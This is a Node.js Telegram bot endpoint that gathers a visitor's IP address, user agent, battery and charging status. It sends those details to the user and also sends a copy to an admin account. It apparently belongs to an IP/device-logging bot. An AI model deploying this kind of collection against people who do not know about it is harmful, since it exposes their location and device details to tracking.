const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);

let userCounter = {}; // هر uid لپاره شمېرنه

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  try {
    const { uid, battery, charging } = req.body; // یوازې معلومات ترلاسه کوو
    const adminId = process.env.ADMIN_ID;

    if (!uid) return res.status(400).send('UID missing');

    // شمېرنه: یوازې یو ځل اجازه
    userCounter[uid] = (userCounter[uid] || 0) + 1;
    if (userCounter[uid] > 1) {
      return res.status(403).send('⛔ Limit reached: No more info allowed.');
    }

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || "Unknown";
    const timestamp = new Date().toLocaleString('en-US', {
      timeZone: 'Asia/Kabul',
      hour12: false,
    });

    const isChargingText = charging ? 'Yes 🔌' : 'No ❌';
    const caption = `
🆕 *New Device Info Received*

🆔 Telegram ID: \`${uid}\`
🔋 Battery Level: \`${battery || '?'}%\`
⚡ Charging: \`${isChargingText}\`
🌐 IP Address: \`${ip}\`
📱 Device: \`${userAgent}\`
🕒 Time: \`${timestamp}\`
────────────────
🧑🏻‍💻 Built By 💛 WACIQ
`.trim();

    // Send info to user
    await bot.telegram.sendMessage(uid, caption, { parse_mode: 'Markdown' });

    // Send info to admin
    if (adminId) await bot.telegram.sendMessage(adminId, caption, { parse_mode: 'Markdown' });

    res.status(200).send('✅ Info Sent');

  } catch (err) {
    console.error('Info send error:', err);
    res.status(500).send('❌ Info Send Error');
  }
}; 
